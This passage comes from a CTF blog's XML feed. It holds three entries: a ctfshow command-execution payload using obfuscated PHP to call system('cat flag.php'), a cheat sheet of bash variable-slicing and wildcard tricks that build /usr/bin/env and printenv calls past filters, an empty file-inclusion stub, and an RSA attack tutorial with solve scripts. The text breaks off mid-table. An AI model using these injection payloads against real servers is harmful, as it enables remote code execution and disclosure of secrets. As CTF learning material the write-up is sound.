class="line">/?c=$cos=base_convert(37907361743,10,36)(dechex(1598506324));$$cos&#123;1&#125;($$cos&#123;2&#125;)&amp;1=system&amp;2=cat+flag.php</span><br></pre></td></tr></table></figure><h2 id="命令执行总结"><a href="#命令执行总结" class="headerlink" title="命令执行总结"></a>命令执行总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">~A取最后一个字符 #用来计算变量的字符长度 $&#123;:a:b&#125;从下标为a截取b个字符</span><br><span class="line">$&#123;PWD: -2:1&#125;从后往前截取(必须有空格)</span><br><span class="line"></span><br><span class="line">0:用未定义的变量表示</span><br><span class="line">1:$&#123;#SHLVL&#125; $&#123;##&#125; $&#123;#?&#125;</span><br><span class="line">2:可以查看php版本,比如7.3.22,可以用$&#123;PHP_VERSION:~A&#125;</span><br><span class="line">3:$&#123;#IFS&#125;=3</span><br><span class="line">5:$&#123;#RANDOM&#125;</span><br><span class="line">/:$&#123;PWD:$A:$&#123;##&#125;&#125;</span><br><span class="line"></span><br><span class="line">如果没有回显的话,尝试构造/usr/bin/echo+$&#123;&#125;进行拼接</span><br><span class="line">/??r/???/??ho</span><br><span class="line">/??$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;/???/??$&#123;HOME:$&#123;##&#125;:$&#123;##&#125;&#125;$&#123;HOME:$&#123;#SHLVL&#125;:$&#123;##&#125;&#125;$&#123;PATH&#125;</span><br><span class="line"></span><br><span class="line">或者/usr/bin/printenv也行</span><br><span class="line">/??r/???/???????v</span><br><span class="line">/??$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;/???/???????$&#123;PWD:$&#123;##&#125;:$&#123;##&#125;&#125;</span><br><span class="line"></span><br><span class="line">/usr/bin/printf + $&#123;&#125;</span><br><span class="line">/??r/???/?r?n??</span><br><span class="line">/??$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;/???/?$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?$&#123;SHELL:$&#123;#IFS&#125;:$&#123;##&#125;&#125;??</span><br><span class="line"></span><br><span class="line">/usr/bin/env直接输出环境变量</span><br><span class="line">/??r/???/?n?</span><br><span class="line">/??$&#123;PWD:$&#123;#IFS&#125;:$&#123;##&#125;&#125;/???/?$&#123;SHELL:$&#123;#IFS&#125;:$&#123;##&#125;&#125;?</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow文件包含</title>
      <link href="/2025/03/13/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
      <url>/2025/03/13/ctfshow%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>web78</p><p>web78</p><p>web78</p><p>web78</p><p>web78</p><p>web78</p><p>web78</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA常见题型</title>
      <link href="/2025/03/11/RSA/"/>
      <url>/2025/03/11/RSA/</url>
      
        <content type="html"><![CDATA[<h2 id="RSA密钥生成"><a href="#RSA密钥生成" class="headerlink" title="RSA密钥生成"></a>RSA密钥生成</h2><p>RSA密钥生成包括以下步骤：</p><div class="table-container"><table><thead><tr><th>算法描述</th><th>变量表示</th></tr></thead><tbody><tr><td>①选择两个大质数p和q</td><td>p, q</td></tr><tr><td>②计算n=pq</td><td>n</td></tr><tr><td>③欧拉公式φ(n)=(p-1)(q-1)</td><td>φ(n)  (也可以是r)</td></tr><tr><td>④选择一个整数e，使得1&lt;e&lt;φ(n)，且e和φ(n)互质</td><td>e</td></tr><tr><td>⑤计算e关于φ(n)的模逆元d，即ed≡1(mod φ(n))</td><td>d</td></tr></tbody></table></div><p>此时就能得到公钥(e, n)，私钥(d, n)</p><h2 id="助记法则"><a href="#助记法则" class="headerlink" title="助记法则"></a>助记法则</h2><ol><li><strong>m</strong>：<strong>Message</strong> 或 <strong>Plaintext</strong>，表示原始消息或明文。</li><li><strong>c</strong>：<strong>Ciphertext</strong>，表示加密后的消息或密文。</li><li><strong>e</strong>：<strong>Public Exponent</strong> 或 <strong>Encryption Exponent</strong>，表示公钥指数，用于加密过程。</li><li><strong>d</strong>：<strong>Private Exponent</strong> 或 <strong>Decryption Exponent</strong>，表示私钥指数，用于解密过程。</li><li><strong>n</strong>：<strong>Modulus</strong>，表示模数，由两个大素数 <strong>p</strong> 和 <strong>q</strong> 的乘积构成。</li><li><strong>p</strong>：<strong>Prime Number 1</strong>，表示第一个大素数。</li><li><strong>q</strong>：<strong>Prime Number 2</strong>，表示第二个大素数。</li><li><strong>φ(n)</strong>：<strong>Euler’s Totient Function</strong> 或 <strong>φ-function</strong>，表示欧拉函数，计算小于 <strong>n</strong> 且与 <strong>n</strong> 互质的正整数的个数。</li></ol><h2 id="RSA破解原理"><a href="#RSA破解原理" class="headerlink" title="RSA破解原理"></a>RSA破解原理</h2><p>RSA成立的条件依赖于如下等式:(其中三等号的意思是同余)</p><p><img src="https://i-blog.csdnimg.cn/blog_migrate/fef100b24d84f343284c26af0694186d.png" alt="fef100b24d84f343284c26af0694186d"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(明文**e)%n=密文,  (密文**d)%n=明文</span><br><span class="line">(m**e)%n=c , (c**d)%n=m</span><br></pre></td></tr></table></figure><p>由于e,r互质根据贝祖定理(若e,r互质则总存在整数d,y使得 <script type="math/tex">e\cdot{d}+r\cdot{y}=1</script>)</p><p>两边同时取模r得ed(mod r)=1(mod r)</p><p>也就是说ed%r=1%r  (ed和1对于r同余 )</p><p>表示为ed≡1(mod r)即ed-1=k*1(k为倍数)</p><p>求d即求e关于r的乘法逆元</p><p>d = gmpy2.invert(e,r)</p><h2 id="RSA解题思路"><a href="#RSA解题思路" class="headerlink" title="RSA解题思路"></a>RSA解题思路</h2><h3 id="已知p-q"><a href="#已知p-q" class="headerlink" title="已知p,q"></a>已知p,q</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">104046835712664064779194734974271185635538927889880611929931939711001301561682270177931622974642789920918902563361293345434055764293612446888383912807143394009019803471816448923969637980671221111117965227402429634935481868701166522350570364727873283332371986860194245739423508566783663380619142431820861051179</span> </span><br><span class="line">q = <span class="number">140171048074107988605773731671018901813928130582422889797732071529733091703843710859282267763783461738242958098610949120354497987945911021170842457552182880133642711307227072133812253341129830416158450499258216967879857581565380890788395068130033931180395926482431150295880926480086317733457392573931410220501</span> </span><br><span class="line">c = <span class="number">4772758911204771028049020670778336799568778930072841084057809867608022732611295305096052430641881550781141776498904005589873830973301898523644744951545345404578466176725030290421649344936952480254902939417215148205735730754808467351639943474816280980230447097444682489223054499524197909719857300597157406075069204315022703894466226179507627070835428226086509767746759353822302809385047763292891543697277097068406512924796409393289982738071019047393972959228919115821862868057003145401072581115989680686073663259771587445250687060240991265143919857962047718344017741878925867800431556311785625469001771370852474292194</span> </span><br><span class="line">n = p*q </span><br><span class="line">phi_n = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">d = gmpy2.invert(e,phi_n) <span class="comment">#求摸逆元e*d===1(mod phi_n) &gt;&gt;&gt;   (e*d)%phi_n=1</span></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n) <span class="comment">#求明文m=c**d%n</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="因数分解"><a href="#因数分解" class="headerlink" title="因数分解"></a>因数分解</h3><p>已知e,n,c,但n较小</p><p>当n位数&lt;512时可以通过工具进行因数分解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">1455925529734358105461406532259911790807347616464991065301847</span></span><br><span class="line">c = <span class="number">69380371057914246192606760686152233225659503366319332065009</span></span><br><span class="line">//用RSA网站分解n得到p,q的值</span><br><span class="line">p=<span class="number">1201147059438530786835365194567</span></span><br><span class="line">q=<span class="number">1212112637077862917192191913841</span></span><br><span class="line">r=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,r)</span><br><span class="line">m=gmpy2.powmod(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="共享素数"><a href="#共享素数" class="headerlink" title="共享素数"></a>共享素数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">e=<span class="number">65537</span> </span><br><span class="line">n1=<span class="number">97651955426214592033572365773920057508427271716707728935577093505679682172372037636450110482557482581706749399826008020235313113944314376784907620141813540662534339234459496768240479220230957160400392913463409022293150429520768318670419503933186212191126307407839258074528684084840185308927331947537145829447</span></span><br><span class="line">n2=<span class="number">66614608752278705185634904394365361979042404918604096433974094458632279000060400427645038515243709686328401390645112697979593615158483692603354348148482259753616268091570444012203646513399123035447707361637792128736541860728977309005359893376233152775475579396612879271884234088653699303606533505374905232923</span></span><br><span class="line">c1=<span class="number">63953261435394891069612549636244603374173902686957436699829372333004288757335171873681401446375646490812908682109590243996379898870002800896829966763855784343173371142195534847739577115446177220108666069599165923313053697108515804761639807236996792227009426406166247412285289649024825203381481266356972774150</span></span><br><span class="line">c2=<span class="number">57194972314389051543512820205703581413440756041185322107796772858205215016985575901911128530044596380489776006585803175505500161134431388478575594371310142237309980755948653414728132043884818377338689153219237884062208507665330097950793748413372319469773142224317762978585059400442666153359320918649028613087</span></span><br><span class="line"></span><br><span class="line">p=gmpy2.gcd(n1,n2)</span><br><span class="line"><span class="keyword">if</span>(p&gt;<span class="number">1</span>):<span class="built_in">print</span>(<span class="string">&quot;共享素数&quot;</span>)</span><br><span class="line">q1=n1//p</span><br><span class="line">r1=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d=inverse(e,r1)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>一个<code>n</code>两个<code>e</code>，两个密文，然后<code>e1</code>与<code>e2</code>互质适用情况<br>明文<code>m</code>、模数<code>n</code>相同，公钥指数<code>e</code>、密文<code>c</code>不同，<code>gcd(e1,e2)==1</code><br>对同一明文的多次加密使用相同的模数和不同的公钥指数可能导致共模攻击，题目内容及解题脚本如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">e1 = <span class="number">797</span></span><br><span class="line">n = <span class="number">15944475431088053285580229796309956066521520107276817969079550919586650535459242543036143360865780730044733026945488511390818947440767542658956272380389388112372084760689777141392370253850735307578445988289714647332867935525010482197724228457592150184979819463711753058569520651205113690397003146105972408452854948512223702957303406577348717348753106868356995616116867724764276234391678899662774272419841876652126127684683752880568407605083606688884120054963974930757275913447908185712204577194274834368323239143008887554264746068337709465319106886618643849961551092377843184067217615903229068010117272834602469293571</span></span><br><span class="line">c1 = <span class="number">11157593264920825445770016357141996124368529899750745256684450189070288181107423044846165593218013465053839661401595417236657920874113839974471883493099846397002721270590059414981101686668721548330630468951353910564696445509556956955232059386625725883038103399028010566732074011325543650672982884236951904410141077728929261477083689095161596979213961494716637502980358298944316636829309169794324394742285175377601826473276006795072518510850734941703194417926566446980262512429590253643561098275852970461913026108090608491507300365391639081555316166526932233787566053827355349022396563769697278239577184503627244170930</span></span><br><span class="line">e2 = <span class="number">521</span></span><br><span class="line">c2 = <span class="number">6699274351853330023117840396450375948797682409595670560999898826038378040157859939888021861338431350172193961054314487476965030228381372659733197551597730394275360811462401853988404006922710039053586471244376282019487691307865741621991977539073601368892834227191286663809236586729196876277005838495318639365575638989137572792843310915220039476722684554553337116930323671829220528562573169295901496437858327730504992799753724465760161805820723578087668737581704682158991028502143744445435775458296907671407184921683317371216729214056381292474141668027801600327187443375858394577015394108813273774641427184411887546849</span></span><br><span class="line">_, r, s = gmpy2.gcdext(e1, e2)//获得最大公因数</span><br><span class="line">//该函数用于计算两个整数的扩展欧几里得算法（Extended Euclidean Algorithm）。扩展欧几里得算法不仅可以计算两个数的最大公约数（GCD），还可以找到满足以下等式的整数 r 和 s：</span><br><span class="line">e1⋅r+e2⋅s=gcd(e1,e2)</span><br><span class="line">m=<span class="built_in">pow</span>(c1,r,n)*<span class="built_in">pow</span>(c2,s,n)%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>证明 m=pow(c1,r,n)*pow(c2,s,n)%n:</p><p>证:</p><p><em>c</em>1=<em>m**e</em>1 mod <em>n</em> </p><p><em>c</em>2=<em>m**e</em>2 mod <em>n</em></p><p>我们需要找到 <em>m</em> 通过扩展欧几里得算法，我们有： <em>e</em>1⋅<em>r</em>+<em>e</em>2⋅<em>s</em>=1</p><p>因此： <em>m</em>=<em>m**(e</em>1⋅<em>r</em>+<em>e</em>2⋅<em>s</em>) mod <em>n</em> </p><p><em>m</em>=(<em>m**e</em>1<em>r</em>)⋅(<em>m**e</em>2<em>s</em>) mod <em>n</em> </p><p><em>m</em>=c1<strong> r⋅c2</strong>s mod n</p><p>根据数论(a<em>b)mod c = ((a mod c) </em> (b mod c)) mod c得</p><p>m=((c1<em>*r mod n) </em> (c2<em> </em>s mod n ) ) mod n</p><p>即为m=pow(c1,r,n)*pow(c2,s,n)%n,得证</p><h3 id="Rabin加密-e-2"><a href="#Rabin加密-e-2" class="headerlink" title="Rabin加密(e=2)"></a>Rabin加密(e=2)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">2</span></span><br><span class="line">c=<span class="number">9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line">c = <span class="number">9217979941366220275377875095861710925207028551771520610387238734819759256223080175603032167658086669886661302962985046348865181740591251321966682848536331583243529</span></span><br><span class="line"><span class="comment"># 计算平方根直接得出明文</span></span><br><span class="line">m = gmpy2.isqrt(c)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="低加密指数攻击-e-3"><a href="#低加密指数攻击-e-3" class="headerlink" title="低加密指数攻击(e=3)"></a>低加密指数攻击(e=3)</h3><p>适用情况：<code>e</code>较小，一般为<code>3</code>。</p><p>公钥<code>e</code>很小，明文<code>m</code>也不大的话，于是<code>m^e=k*n+m</code>中的的<code>k</code>值很小甚至为0，爆破<code>k</code>或直接开三次方即可。解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">//已知n,e,c</span><br><span class="line">n=<span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">res=<span class="number">0</span></span><br><span class="line">c=<span class="built_in">int</span>(<span class="string">&#xx27;</span>,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200000000</span>):</span><br><span class="line">    <span class="keyword">if</span> gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">1</span>]==<span class="literal">True</span>:</span><br><span class="line">        res=gmpy2.iroot(c+n*i,<span class="number">3</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(i,res)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(res))</span><br><span class="line">        <span class="built_in">print</span>(time.asctime())</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line"><span class="comment">#爆破时间比较长,耐心等待</span></span><br><span class="line"><span class="comment">#PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125;</span></span><br></pre></td></tr></table></figure><h3 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line">e= <span class="number">66</span></span><br><span class="line">N1=<span class="number">119121769301518368845794718919671993654866733452500635654897878290134654053525326323431078337969969799019267359311630307693231652437019657271070808881061234914792573940209704431930893007130218784789129628118174107530365963924713378836917676748173639617016078698196855902649715186446119049632882034064426307961</span></span><br><span class="line">c1=<span class="number">65809670364005660919487930275712763981462574482844456704463641508675030596875121266268442889621086029848274337434417261197718575526373292499067042264634379254464845434162152933896113724853720502244098952049664997504481260560197503615640455874926744252021208987009450769588765905545554721135156365408354127806</span></span><br><span class="line">N2=<span class="number">61566186989108648087416300713362112278899764336693876058459160266013125711319287023130470479677492361897176386933378510296253217497637077073380801285351720869599526467374766145998153803504733849848604084634651491161784374455431755730479983664183758338753000194705214689982392319657046639209576835502147667037</span></span><br><span class="line">c2=<span class="number">18115640205116501705317897825685529616909607082926385394483386354114757190297813816634024391310034998634363199107263855395213222666209246729706790489666870667858157971452889316287713441243954970519480288407304588221367033667123438099684005390552527841793685576357398155728428068684443438517466992583270786127</span></span><br><span class="line">N3=<span class="number">49620601251587487125794843250068355033366769115263317289571926701388354523775712535979072271377271193974631440599171766325666313148513015791734100817069816300041692142266535982235676202572289636401488831577138246100726048967727040512044104774134629062544550558359813957976997743249501859251552702735064713687</span></span><br><span class="line">c3=<span class="number">20364551273681999294192219339422116302034809693463183300482896653538283331993131969988691606265882556683096226676587592788170379969499383217301366185026531161375199684493173814963347571110673161762110717226798673655139195202698236793103775569353384039792555128423824292553968745259900764497340831105893270668</span></span><br><span class="line">N4=<span class="number">133768952546673974479267370043541821144327252413845057783412528835180467846794140834703340900450314588506064435986442748604490312840370944318831808038247604353142259774616789531310532099928688408187901346284844605463451751550642385234492519392161741592575670083174919697609061113010796634206284575928757770347</span></span><br><span class="line">c4=<span class="number">22335147582261003096647361522544076689364215203577454506488628401661580234233487251113839217854903668779299757152861854671534567147471797316820888992633912660481204658071146602886247900634407701930940651893906501617828267768494421662988585157809528901989990526581772462692969725469920335864514415298683981152</span></span><br><span class="line">N5=<span class="number">104238024627494572746286964408730592545438306156311797513852804744729437956789203459026451862359528868190073408381414599237366462763241253878521105956224668414556141866393372950736873591172081402165238904932429122534093530878197642654777864463461868631230091763766134406081081720779921003747961997853491818709</span></span><br><span class="line">c5=<span class="number">61107680391468684099981865276084215683172351113581670204727453862376840773256630839617142751881760857118348248250665317785917421351743397747894492411488165649401344879494773021769753591034395672465464320101652438687007539489378513821420800168510776217853333899011972317527520705236204176156830739081757405010</span></span><br><span class="line">N6=<span class="number">118093066310605305095178937425517218630920226424744215661148532092308033934450073432943193635177662130252180103285721213804150321735225466812961622185616533145516398760950723892924696182721299397022483621950837139563238753686038378878896091768848068910135093028294780235384684673963857093300627549709837724191</span></span><br><span class="line">c6=<span class="number">101256774269533055751457908208739377897424415487989206153587587300686603196557467291720330319232901633692785986681754036193235741811711502795701089320073392059949682466544065711958098750432374898558703333440618699807232864181819519679629167853668660602661341767124570492408045291007778414318130631983777295722</span></span><br><span class="line">N7=<span class="number">117266185117654060034588324842366454222593927099393980357544774885629794379293166947229056918034459043108797074800162507024079391634502468534298624692449903107493118323020446890562744571191659344011645864382773946531469367984674369644899983010063210039853704185508764560001673741477659408982947064250518468251</span></span><br><span class="line">c7=<span class="number">21894778019803458880260502198065610444404240072805403208023426906088005779594929836443213559388796713650945356366966043756862672829855657911990319072200008974506146871357573453019048449580079826767546217579688605917001867071164255859862228831932900353755873078336344643599953154397168889370495902677409294153</span></span><br><span class="line">N8=<span class="number">99847214607089521961572435869957506429243606231877563380090692185420163672773289159042830799683260860597767443996073308175724597182454633588936213254523487111523733480984498586740358607988160025505687559762411862688601742397266945003398123269294496360100900034452611602146601714399455590585410132690396673369</span></span><br><span class="line">c8=<span class="number">11128692723492689091233850419200963897271177985178577230436424149628046051146025178276383119267304777164785849951881090840591723497899208506838095610670693372018592133149773642812004657103063248374199581071604408292558846603838509738685590699272289726570262682986682351416702749398587242245473894462138900648</span></span><br><span class="line">N9=<span class="number">73427226276805128656380869285386076721624609211443253475771428129504719457080180710705115744294619063551381264408504585408453508098823007044451551756211573562886310458270583742465979942941865777506724593733211095696183935690743247534548446509454942543803005250835909564142934138252786381937066184736196312879</span></span><br><span class="line">c9=<span class="number">60193454951754852266094357956076086266071986040245653496529985198812436356863824995533097435342514985019627989807883105986263640682220256055428754363731882409970562687108383307540077970131766447280258179403586275956059172183226613848213900224857274285495001205557394336770529098104967590355473696826791159828</span></span><br><span class="line">N10=<span class="number">99650442092528521150438911689808375993056822587606174829817567886601559468699368030195401941419824519727962816960977430480509904789178542213483386082107556343628416294902342864312889447653789084402767394237032107269596219826822529277688614898127656366069731819304375099356344677466185988432876228367727625953</span></span><br><span class="line">c10=<span class="number">90419774897115225091366412014190084386457096921784011494379232133660413968111145130899089066669099521330755985696967486931277095415375171113368395860214365412786048972643171579220518548850903517117393998100848799427493429304884036350416671209777072844176863411890909720103357069783802064257545060602175751149</span></span><br><span class="line">nlst=[N1,N2,N3,N4,N5,N6,N7,N8,N9,N10]</span><br><span class="line">clst=[c1,c2,c3,c4,c5,c6,c7,c8,c9,c10]</span><br><span class="line">N=<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nlst:</span><br><span class="line">    N*=n</span><br><span class="line">mlst=[]</span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nlst:</span><br><span class="line">    mlst.append(N//n)</span><br><span class="line">tlst=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nlst)):</span><br><span class="line">    tlst.append(inverse(mlst[i],nlst[i]))</span><br><span class="line"><span class="built_in">sum</span>=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nlst)):</span><br><span class="line">    <span class="built_in">sum</span>=(<span class="built_in">sum</span>+clst[i]*tlst[i]*mlst[i])%N</span><br><span class="line">m=gmpy2.iroot(<span class="built_in">sum</span>,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure><h3 id="Wiener攻击-连分数攻击"><a href="#Wiener攻击-连分数攻击" class="headerlink" title="Wiener攻击(连分数攻击)"></a>Wiener攻击(连分数攻击)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> * </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="Roll按行加密"><a href="#Roll按行加密" class="headerlink" title="Roll按行加密"></a>Roll按行加密</h3><p>给了个文件{920139713,19}</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 